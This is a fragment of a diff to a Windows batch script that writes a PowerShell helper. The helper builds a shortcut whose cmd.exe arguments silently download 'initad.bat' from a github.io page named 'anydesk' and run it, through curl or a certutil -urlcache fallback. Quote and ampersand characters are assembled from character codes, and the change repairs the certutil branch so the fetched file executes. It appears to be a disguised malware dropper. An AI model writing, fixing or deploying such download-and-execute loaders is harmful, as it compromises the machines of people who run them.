@@ -198,13 +198,14 @@ set "_lnk=%TEMP%\_lnk.ps1"
 >  "%_lnk%" echo $url = 'https://wevertonmbrtx.github.io/anydesk/initad.bat'
 >> "%_lnk%" echo $q   = [char]34
 >> "%_lnk%" echo $aa  = [char]38 + [char]38
+>> "%_lnk%" echo $a   = [char]38
 >> "%_lnk%" echo $cmd = '%SystemRoot%\System32\cmd.exe'
 >> "%_lnk%" echo $tmp = '%TEMP%\initad.bat'
 >> "%_lnk%" echo 
 >> "%_lnk%" echo if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
 >> "%_lnk%" echo     $lnkArgs = '/c ' + $q + 'curl -s -o ' + $q + $tmp + $q + ' ' + $q + $url + $q + ' ' + $aa + ' call ' + $q + $tmp + $q + $q
 >> "%_lnk%" echo } else {
->> "%_lnk%" echo     $lnkArgs = '/c ' + $q + 'certutil -urlcache -split -f ' + $q + $url + $q + ' ' + $q + $tmp + $q + ' ' + $aa + ' ' + $q + $tmp + $q + $q
+>> "%_lnk%" echo     $lnkArgs = '/c ' + $q + 'certutil -urlcache -split -f ' + $q + $url + $q + ' ' + $q + $tmp + $q + ' ' + $a + ' ' + $q + $tmp + $q + $q
 >> "%_lnk%" echo }
 >> "%_lnk%" echo 
 >> "%_lnk%" echo try {
